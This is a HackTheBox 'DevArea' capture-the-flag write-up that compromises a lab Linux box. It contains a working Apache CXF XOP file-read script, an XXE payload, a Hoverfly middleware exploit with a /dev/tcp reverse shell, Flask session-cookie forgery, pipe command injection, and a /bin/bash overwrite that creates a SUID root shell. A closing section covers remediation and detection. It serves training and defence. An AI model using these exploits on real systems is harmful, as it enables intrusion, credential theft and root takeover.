---
title: DevArea
os: Linux
difficulty: Medium
tags:
  - FTP Anonymous
  - Decompilation
  - Apache CXF
  - LFI
  - Hoverfly
  - Middleware RCE
  - Flask Unsign
  - Cookie Forgery
  - World-Writable Binary
  - Privilege Escalation
  - CVE-2022-46364
  - CVE-2025-54123
---

# 🛡️ HTB - DevArea (Medium)

<p align="center">
  <img src="https://img.shields.io/badge/Platform-HackTheBox-green?style=for-the-badge&logo=hackthebox" alt="HackTheBox" />
  <img src="https://img.shields.io/badge/OS-Linux-orange?style=for-the-badge&logo=linux" alt="OS Linux" />
  <img src="https://img.shields.io/badge/Difficulty-Medium-orange?style=for-the-badge" alt="Medium Difficulty" />
</p>

---

### 💻 Target Information
- **Machine Name:** DevArea
- **Operating System:** Linux
- **Difficulty:** Medium
- **Vulnerabilities:** Apache CXF XOP Include LFI (CVE-2022-46364), Hoverfly Middleware RCE (CVE-2025-54123), SysWatch Flask Session Cookie Forgery, World-Writable `/bin/bash` Privilege Escalation

---

## Step 1 - Reconnaissance

Will Use Nmap To See what Ports and Services are Open

```bash
nmap -A -sS -P -T4  --min-rate 5000 10.129.14.43
```

```text
Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-03-29 13:52 UTC
Stats: 0:01:46 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
Service scan Timing: About 100.00% done; ETC: 13:53 (0:00:00 remaining)
Nmap scan report for 10.129.14.43
Host is up (0.25s latency).
Not shown: 994 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
21/tcp   open  ftp     vsftpd 3.0.5
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_drwxr-xr-x    2 ftp      ftp          4096 Sep 22  2025 pub
| ftp-syst:
|   STAT:
| FTP server status:
|      Connected to ::ffff:10.10.15.183
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 1
|      vsFTPd 3.0.5 - secure, fast, stable
|_End of status
22/tcp   open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.15 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 83:13:6b:a1:9b:28:fd:bd:5d:2b:ee:03:be:9c:8d:82 (ECDSA)
|_  256 0a:86:fa:65:d1:20:b4:3a:57:13:d1:1a:c2:de:52:78 (ED25519)
80/tcp   open  http    Apache httpd 2.4.58
|_http-title: Did not follow redirect to http://devarea.htb/
|_http-server-header: Apache/2.4.58 (Ubuntu)
8080/tcp open  http    Jetty 9.4.27.v20200227
|_http-server-header: Jetty(9.4.27.v20200227)
|_http-title: Error 404 Not Found
8500/tcp open  fmtp?
8888/tcp open  http    Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
|_http-title: Hoverfly Dashboard
```

- 🔍 *FTP has anonymous login enabled. Let's inspect the files on the FTP server:*

```bash
ftp devarea.htb
```

```text
Connected to devarea.htb.
220 (vsFTPd 3.0.5)
Name (devarea.htb:kali): anonymous
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> cd pub
250 Directory successfully changed.
ftp> ls
229 Entering Extended Passive Mode (|||46068|)
150 Here comes the directory listing.
-rw-r--r--    1 ftp      ftp       6445030 Sep 22  2025 employee-service.jar
226 Directory send OK.
ftp> get employee-service.jar
local: employee-service.jar remote: employee-service.jar
229 Entering Extended Passive Mode (|||48727|)
150 Opening BINARY mode data connection for employee-service.jar (6445030 bytes).
100% |*******|  6293 KiB  233.25 KiB/s    00:00 ETA
226 Transfer complete.
```

- 🔍 *Extracted `employee-service.jar`. Unzipping its contents to analyze the codebase:*

```bash
unzip employee-service.jar -d target_directory/
cd target_directory/htb/devarea/
ls
```

```text
EmployeeService.class      Report.class
EmployeeServiceImpl.class  ServerStarter.class
```

- 🔍 *Decompiling the Java classes using `javap` to inspect the program logic:*

```bash
javap -c -p EmployeeServiceImpl.class
```

```text
Compiled from "EmployeeServiceImpl.java"
public class htb.devarea.EmployeeServiceImpl implements htb.devarea.EmployeeService {
  public htb.devarea.EmployeeServiceImpl();
  public java.lang.String submitReport(htb.devarea.Report);
...
```

```bash
javap -c -p ServerStarter.class
```

```text
Compiled from "ServerStarter.java"
public class htb.devarea.ServerStarter {
  public htb.devarea.ServerStarter();
    Code:
      ...
      26: ldc           #9                  // String http://0.0.0.0:8080/employeeservice
      39: ldc           #13                 // String Employee Service running at http://localhost:8080/employeeservice
      ...
}
```

> [!NOTE]
> **Codebase Architecture Breakdown:**
> - `EmployeeService.class`: Defines the service contract interfaces.
> - `EmployeeServiceImpl.class`: Implements the `submitReport` logic which processes report submissions.
> - `Report.class`: Defines fields (`employeeName`, `department`, `content`, `confidential`) representing the data model.
> - `ServerStarter.class`: Initializes Jetty on port 8080 mapping the service to `/employeeservice`.

---

## Step 2 - Enumeration

- 🔍 *The web service is a SOAP application. We can query the public WSDL blueprint to understand the XML parameters expected by the server:*

```xml
<wsdl:definitions name="EmployeeServiceService" targetNamespace="http://devarea.htb/">
  ...
</wsdl:definitions>
```

- 🔍 *Since the endpoint processes XML data, we test for XML External Entity (XXE) Injection by submitting a crafted DOCTYPE query payload to `/employeeservice`:*

```http
POST /employeeservice HTTP/1.1
Host: devarea.htb:8080
Content-Type: text/xml
Connection: close

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org" xmlns:dev="http://devarea.htb">
   <soapenv:Header/>
   <soapenv:Body>
      <dev:submitReport>
         <arg0>
            <employeeName>Admin</employeeName>
            <department>IT</department>
            <content>&xxe;</content>
         </arg0>
      </dev:submitReport>
   </soapenv:Body>
</soapenv:Envelope>
```

- 🔍 *The server returns a 500 error response:*

```http
HTTP/1.1 500 Server Error
Content-Type: text/xml;charset=iso-8859-1
Server: Jetty(9.4.27.v20200227)

<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"><soap:Body><soap:Fault><faultcode>soap:Client</faultcode><faultstring>Error reading XMLStreamReader: Received event DTD, instead of START_ELEMENT or END_ELEMENT.</faultstring></soap:Fault></soap:Body></soap:Envelope>
```

> [!NOTE]
> **Exploitation Barrier (DTD Disabled):**
> Standard XXE fails because the parser (Apache CXF) has DTD processing disabled. Seeing a `<!DOCTYPE` block violates security policies, throwing a parser exception.

- 🔍 *Although standard DTDs are blocked, the framework Apache CXF is vulnerable to LFI via XOP Include (CVE-2022-46364).*

> [!IMPORTANT]
> **Apache CXF XOP LFI (CVE-2022-46364):**
> SOAP MTOM allows binary attachments. By referencing a local file path inside an `xop:Include` tag (`href="file:///path"`), we coerce the server's XML-attachment resolver into reading the target file. The engine resolves the entity, Base64 encodes it, and prints it back in the mirrored application reflection ("Report received from [EmployeeName]").

- 🔍 *Crafting a Bash script to automate local file reads using the XOP Include vector:*

```bash
#!/bin/bash
# CVE-2022-46364 - Apache CXF XOP LFI Exploit
TARGET="http://devarea.htb:8080/employeeservice"

if [ -z "$1" ]; then
    echo "Usage: $0 <file_path>"
    exit 1
fi
FILE="$1"

RESPONSE=$(curl -s -X POST "$TARGET" \
  -H 'Content-Type: multipart/related; type="application/xop+xml"; start="root.message@cxf.apache.org"; start-info="text/xml"; boundary="----=_Part_1"' \
  -d $'------=_Part_1\r\nContent-Type: application/xop+xml; charset=UTF-8; type="text/xml"\r\nContent-Transfer-Encoding: 8bit\r\nContent-ID: root.message@cxf.apache.org\r\n\r\n<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:dev="http://devarea.htb/">\r\n   <soapenv:Header/>\r\n   <soapenv:Body>\r\n      <dev:submitReport>\r\n         <arg0>\r\n            <employeeName><xop:Include xmlns:xop="http://www.w3.org/2004/08/xop/include" href="'"$FILE"'"/></employeeName>\r\n            <department>IT</department>\r\n            <content>test</content>\r\n            <confidential>false</confidential>\r\n         </arg0>\r\n      </dev:submitReport>\r\n   </soapenv:Body>\r\n</soapenv:Envelope>\r\n------=_Part_1--')

B64=$(echo "$RESPONSE" | grep -oP 'from \K[^.]+')
if [ -z "$B64" ]; then
    B64=$(echo "$RESPONSE" | grep -oP '(?<=<employeeName>)[^<]+')
fi

echo "[+] File: $FILE"
echo "$B64" | base64 -d 2>/dev/null || echo "$B64"
```

---

## Step 3 - Initial Foothold

- 🔍 *Running the LFI exploit to read `/etc/passwd`:*

```bash
./exploit.sh file:///etc/passwd
```

```text
[+] File: file:///etc/passwd
root:x:0:0:root:/root:/bin/bash
dev_ryan:x:1001:1001::/home/dev_ryan:/bin/bash
```

- 🔍 *We identify a system user: `dev_ryan`.*
- 🔍 *We see a Hoverfly service dashboard running on port 8888. We read the Systemd service configuration to find hardcoded flags or configurations:*

```bash
./exploit.sh file:///etc/systemd/system/hoverfly.service
```

```text
[+] File: file:///etc/systemd/system/hoverfly.service
[Service]
User=dev_ryan
Group=dev_ryan
WorkingDirectory=/opt/HoverFly
ExecStart=/opt/HoverFly/hoverfly -add -username admin -password O7IJ27MyyXiU -listen-on-host 0.0.0.0
```

- 🔍 *We harvest Hoverfly administrative credentials:* `admin:O7IJ27MyyXiU`.
- 🔍 *Log into the dashboard at port 8888. The running version is identified as Hoverfly v1.11.3, which is vulnerable to CVE-2025-54123.*

> [!WARNING]
> **Hoverfly Middleware Command Injection (CVE-2025-54123):**
> Hoverfly's middleware API (`/api/v2/hoverfly/middleware`) allows authenticated admins to upload custom processing scripts. By defining `/bin/bash` as the binary and a shell payload as the script, we trigger code execution when requests are processed via Hoverfly's proxy port (`8500`).

- 🔍 *Creating a Python script to authenticate, upload our middleware payload, and trigger a proxy request to execute the shell:*

```python
import requests
import sys

BASE_URL = "http://devarea.htb:8888"
PROXY_URL = "http://devarea.htb:8500"
USER = "admin"
PASS = "O7IJ27MyyXiU"

def get_token():
    url = f"{BASE_URL}/api/token-auth"
    r = requests.post(url, json={"username": USER, "password": PASS})
    return r.json().get("token")

def set_middleware(token, script):
    url = f"{BASE_URL}/api/v2/hoverfly/middleware"
    headers = {"Authorization": f"Bearer {token}", "Content-Type": "application/json"}
    payload = {"binary": "/bin/bash", "script": script}
    return requests.put(url, headers=headers, json=payload).status_code

def trigger_proxy():
    proxies = {"http": f"http://{USER}:{PASS}@devarea.htb:8500"}
    try:
        requests.get("http://devarea.htb/", proxies=proxies, timeout=2)
    except requests.exceptions.RequestException:
        pass

def main():
    token = get_token()
    if not token: sys.exit(1)
    
    lhost = input("LHOST: ")
    lport = input("LPORT: ")
    payload = f"#!/bin/bash\nbash -i >& /dev/tcp/{lhost}/{lport} 0>&1"
    
    if set_middleware(token, payload) == 200:
        print("[+] Middleware configured. Triggering...")
        trigger_proxy()

if __name__ == "__main__":
    main()
```

- 🔍 *Catching the reverse shell as `dev_ryan`:*

```bash
nc -lvnp 4444
```

```text
listening on [any] 4444 ...
connect to [10.10.15.183] from (UNKNOWN) [10.129.14.43] 37638
dev_ryan@devarea:/opt/HoverFly$ whoami
dev_ryan
```

- 🔍 *Initial access achieved as `dev_ryan`. The user flag is read from `/home/dev_ryan/user.txt`.*

---

## Step 4 - Privilege Escalation

- 🔍 *Checking sudo privileges:*

```bash
sudo -l
```

```text
User dev_ryan may run the following commands on devarea:
    (root) NOPASSWD: /opt/syswatch/syswatch.sh, !/opt/syswatch/syswatch.sh web-stop, !/opt/syswatch/syswatch.sh web-restart
```

- 🔍 *Running `/opt/syswatch/syswatch.sh web-status` shows a web GUI running locally on port 7777.*
- 🔍 *We tunnel the port to our attacker machine and read `/etc/syswatch.env` using our LFI:*

```bash
cat /etc/syswatch.env
```

```text
SYSWATCH_SECRET_KEY=f3ac48a6006a13a37ab8da0ab0f2a3200d8b3640431efe440788beaefa236725
SYSWATCH_ADMIN_PASSWORD=SyswatchAdmin2026
```

- 🔍 *We cannot log in with the admin password directly. However, we can forge a session cookie using the exposed Flask secret key:*

```bash
flask-unsign --sign \
  --cookie "{'user_id': 1, 'username': 'admin'}" \
  --secret 'f3ac48a6006a13a37ab8da0ab0f2a3200d8b3640431efe440788beaefa236725'
```

```text
eyJ1c2VyX2lkIjoxLCJ1c2VybmFtZSI6ImFkbWluIn0.ac585A.M2WV3-hqkXFz4M9v5W5INXyqya8
```

- 🔍 *Setting the forged cookie in our browser grants administrative access to the SysWatch dashboard.*
- 🔍 *The dashboard has a Service Status check endpoint vulnerable to command chaining/pipe injection:*

```http
POST /service-status HTTP/1.1
Host: 127.0.0.1:7777
Cookie: session=eyJ1c2VyX2lkIjoxLCJ1c2VybmFtZSI6ImFkbWluIn0...

service=ssh|whoami
```

- 🔍 *The command output returns `syswatch` (the service user).*
- 🔍 *We attempt standard reverse shell payloads, but find that network firewalls block outward calls from this user.*
- 🔍 *Checking file permissions on core system binaries:*

```bash
ls -la /bin/bash
```

```text
-rwxrwxrwx 1 root root 1446024 Mar 31  2024 /bin/bash
```

> [!WARNING]
> **World-Writable Bash Binary:**
> The primary shell `/bin/bash` is world-writable (`rwxrwxrwx`). Any process on the system running `/bin/bash` can be hijacked. Since `syswatch.sh` runs as root via `sudo`, it invokes the shebang `#!/bin/bash`. Hijacking this binary yields immediate root execution.

- 🔍 *Because `/bin/bash` is actively executed by our shell, modifying it triggers a `Text file busy` (ETXTBSY) lock.*
- 🔍 *We bypass the lock by dropping into `dash`, terminating all active bash processes, and writing a malicious bash script overlay directly to `/bin/bash`:*

```bash
# 1. Back up the real bash binary
cp /bin/bash /tmp/bash.bak

# 2. Create the malicious bash payload
cat << 'EOF' > /tmp/evil_bash
#!/tmp/bash.bak
cp /tmp/bash.bak /tmp/rootbash
chmod 4755 /tmp/rootbash
exec /tmp/bash.bak "$@"
EOF

# 3. Enter dash and execute the swap
dash
killall -9 bash
dd if=/tmp/evil_bash of=/bin/bash
```

- 🔍 *We execute the sudo command to trigger our SUID writer payload:*

```bash
sudo /opt/syswatch/syswatch.sh --version
```

- 🔍 *The privileged script calls our hijacked `/bin/bash` as root, creating the SUID shell at `/tmp/rootbash`. We spawn root:*

```bash
/tmp/rootbash -p
whoami
```

```text
root
```

- 🔍 *Root access achieved successfully.*

---

## Mitigations & Security Perspective

> [!IMPORTANT]
> **🛡️ Blue Team Security Assessment Blueprint**
> Below is the post-exploitation blueprint analyzing every vulnerability and administrative configuration issue exploited in the DevArea system. Each identified weakness is mapped to its core risk, threat context, and practical defensive remediation strategies.

### 🔴 Apache CXF XOP XML Injection / LFI (CVE-2022-46364)

> [!WARNING]
> **Vulnerability Profile:**
> The SOAP application is vulnerable to MTOM XOP Include Injection (CVE-2022-46364), enabling unauthenticated LFI by parsing external attachments referenced via custom URIs.

> [!CAUTION]
> **Risk & Downstream Threat Impact:**
> Attackers can read sensitive host configurations, harvest service environment credentials (`hoverfly.service`), and list system usernames, bypassing DTD parsing protections.

> [!TIP]
> **Defensive Remediation & Detection Strategies:**
> - **Remediation:** Update Apache CXF to a version immune to CVE-2022-46364.
> - **Remediation:** Configure XML parsers explicitly to disable external entities and MTOM resolution capabilities.
> - **Detection:** Monitor HTTP request streams for XML nodes containing `xop:Include` or `href="file:///"` tags.

---

### 🔴 Hoverfly Middleware Script OS Command Injection (CVE-2025-54123)

> [!WARNING]
> **Vulnerability Profile:**
> Hoverfly v1.11.3 lacks script validation on the `/api/v2/hoverfly/middleware` interface.

> [!CAUTION]
> **Risk & Downstream Threat Impact:**
> Authenticated attackers can inject arbitrary OS code executed directly by the proxy service user (`dev_ryan`), leading to remote command execution.

> [!TIP]
> **Defensive Remediation & Detection Strategies:**
> - **Remediation:** Apply Hoverfly security patches to block arbitrary middleware execution paths.
> - **Remediation:** Enforce strong authentication policies and run proxy servers under rootless sandboxes.
> - **Detection:** Track and alert on suspicious child processes spawned by proxy engines (`hoverfly` executing shell sessions).

---

### 🔴 World-Writable System Binaries

> [!WARNING]
> **Vulnerability Profile:**
> The primary shell binary `/bin/bash` has insecure permissions set to `777`.

> [!CAUTION]
> **Risk & Downstream Threat Impact:**
> Any local user can overwrite `/bin/bash` to run arbitrary commands under the context of any process invoking a bash shell (such as systemd services or sudo tasks), escalating instantly to root.

> [!TIP]
> **Defensive Remediation & Detection Strategies:**
> - **Remediation:** Set strict file ownership (`root:root`) and permission sets (`755`) on all binaries within bin pathways.
> - **Remediation:** Deploy File Integrity Monitoring (FIM) tools (such as Samhain or Tripwire) to block and report modifications to system execution paths.
